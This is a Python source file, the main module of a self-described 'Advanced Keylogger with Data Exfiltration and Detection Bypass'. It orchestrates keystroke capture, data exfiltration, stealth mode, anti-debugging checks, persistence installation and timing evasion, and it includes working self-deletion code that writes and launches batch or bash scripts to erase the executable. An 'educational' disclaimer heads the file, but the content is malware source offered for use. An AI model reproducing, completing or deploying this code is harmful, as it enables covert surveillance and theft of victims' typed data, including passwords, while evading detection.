#!/usr/bin/env python3
"""
Advanced Keylogger with Data Exfiltration and Detection Bypass
Educational/Research purposes only - Use responsibly and legally
"""

import sys
import signal
import time
import threading
import logging
from pathlib import Path

# Import our modules
from config_manager import Config
from storage_manager import StorageManager
from data_capture import DataCapture
from exfiltration_manager import ExfiltrationManager
from stealth_manager import StealthManager, PersistenceManager

class AdvancedKeylogger:
    """Main keylogger class that orchestrates all components"""
    
    def __init__(self):
        # Initialize configuration
        self.config = Config()
        
        # Initialize managers
        self.storage = StorageManager(self.config)
        self.data_capture = DataCapture(self.config, self.storage)
        self.exfiltration = ExfiltrationManager(self.config, self.storage)
        self.stealth = StealthManager(self.config)
        self.persistence = PersistenceManager(self.config)
        
        # Control flags
        self.running = False
        self.shutdown_event = threading.Event()
        
        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def start(self):
        """Start the keylogger"""
        try:
            logging.info("Starting Advanced Keylogger...")
            
            # Enable stealth mode first
            self.stealth.enable_stealth_mode()
            
            # Perform anti-debug checks
            if self.stealth.anti_debug_checks():
                logging.warning("Potential debugging environment detected")
                if self.config.get('anti_detection.exit_on_debug', False):
                    self._safe_exit()
                    return
            
            # Install persistence if configured
            self.persistence.install_persistence()
            
            # Start data capture
            self.data_capture.start_capture()
            
            # Start exfiltration
            self.exfiltration.start_exfiltration()
            
            self.running = True
            logging.info("Keylogger started successfully")
            
            # Main loop with anti-detection measures
            self._main_loop()
            
        except Exception as e:
            logging.error(f"Failed to start keylogger: {e}")
            self._safe_exit()
    
    def stop(self):
        """Stop the keylogger"""
        logging.info("Stopping keylogger...")
        
        self.running = False
        self.shutdown_event.set()
        
        # Stop data capture
        self.data_capture.stop_capture()
        
        # Stop exfiltration
        self.exfiltration.stop_exfiltration()
        
        # Force final exfiltration if configured
        if self.config.get('exfiltration.force_on_exit', True):
            self.exfiltration.force_exfiltration()
        
        # Cleanup
        self._cleanup()
        
        logging.info("Keylogger stopped")
    
    def _main_loop(self):
        """Main execution loop with anti-detection features"""
        while self.running and not self.shutdown_event.is_set():
            try:
                # Periodic anti-debug checks
                if self.stealth.anti_debug_checks():
                    logging.warning("Debugging environment detected during runtime")
                    if self.config.get('anti_detection.exit_on_debug', False):
                        break
                
                # Periodic cleanup
                self.storage.cleanup_old_files()
                
                # Timing evasion
                self.stealth.timing_evasion()
                
                # Wait before next iteration
                self.shutdown_event.wait(30)  # Check every 30 seconds
                
            except Exception as e:
                logging.error(f"Main loop error: {e}")
                time.sleep(60)  # Wait before retrying
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully"""
        logging.info(f"Received signal {signum}, shutting down...")
        self.stop()
        sys.exit(0)
    
    def _cleanup(self):
        """Perform cleanup operations"""
        try:
            # Remove persistence if configured
            if self.config.get('anti_detection.self_delete_on_exit', False):
                self.persistence.remove_persistence()
            
            # Clean up temporary files
            if self.config.get('cleanup.delete_after_exfiltration', True):
                for file_path in self.storage.get_all_files():
                    self.storage.delete_file(file_path)
            
            # Self-deletion (very aggressive - use with caution)
            if self.config.get('anti_detection.self_delete_on_exit', False):
                self._self_delete()
                
        except Exception as e:
            logging.error(f"Cleanup error: {e}")
    
    def _self_delete(self):
        """Self-delete the executable (use with extreme caution)"""
        try:
            import os
            import subprocess
            
            current_executable = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            
            if os.name == 'nt':
                # Windows batch script for self-deletion
                batch_script = '''
                @echo off
                timeout /t 2 /nobreak > nul
                del /q /f "{}"
                del "%~f0"
                '''.format(current_executable)
                
                with open('temp_delete.bat', 'w') as f:
                    f.write(batch_script)
                
                subprocess.Popen('temp_delete.bat', shell=True)
            else:
                # Unix-like systems
                script = f'''
                #!/bin/bash
                sleep 2
                rm -f "{current_executable}"
                rm -f "$0"
                '''
                
                with open('/tmp/temp_delete.sh', 'w') as f:
                    f.write(script)
                
                os.chmod('/tmp/temp_delete.sh', 0o755)
                subprocess.Popen(['/bin/bash', '/tmp/temp_delete.sh'])
            
        except Exception as e:
            logging.error(f"Self-deletion failed: {e}")
    
    def _safe_exit(self):
        """Safe exit with cleanup"""
        self.stop()
        sys.exit(1)

def main():
    """Main entry point"""
    try:
        # Create and start keylogger
        keylogger = AdvancedKeylogger()
        keylogger.start()
        
    except KeyboardInterrupt:
        logging.info("Interrupted by user")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()